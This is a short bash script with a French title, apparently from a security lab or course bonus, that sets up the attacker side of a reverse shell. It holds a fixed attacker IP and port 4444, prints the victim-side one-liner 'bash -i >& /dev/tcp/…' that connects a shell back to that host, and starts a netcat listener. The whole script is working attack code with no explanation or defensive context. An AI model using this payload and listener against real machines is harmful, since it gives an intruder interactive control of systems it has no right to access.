
# BONUS - Reverse shell (nc) - côté attaquant

#!/bin/bash
ATTACKER_IP="192.168.64.9"
PORT="4444"

echo "[*] nc -lvnp $PORT"
echo "Sur la victime : bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"

if ! command -v nc >/dev/null 2>&1; then
  echo "nc manquant"
  exit 1
fi

nc -lvnp "$PORT"
